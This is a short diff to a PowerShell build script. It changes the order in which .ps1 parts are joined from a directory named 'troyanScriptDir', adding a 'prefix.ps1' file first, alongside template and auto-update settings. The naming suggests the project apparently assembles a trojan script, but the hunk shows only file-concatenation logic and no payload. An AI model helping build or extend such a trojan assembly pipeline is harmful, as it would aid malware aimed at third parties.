@@ -259,9 +259,10 @@ $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPat
 
 #join
 $ps1Files = @(
+    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "prefix.ps1"),
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "consts.ps1"),
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "utils.ps1"),
-    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "extraupdate.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" })
+    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "extraupdate.ps1" -and $_.Name -ne "prefix.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" })
 ) | ForEach-Object { $_ } | Where-Object { $_ -ne $null }
 
 if ($server.autoUpdate)
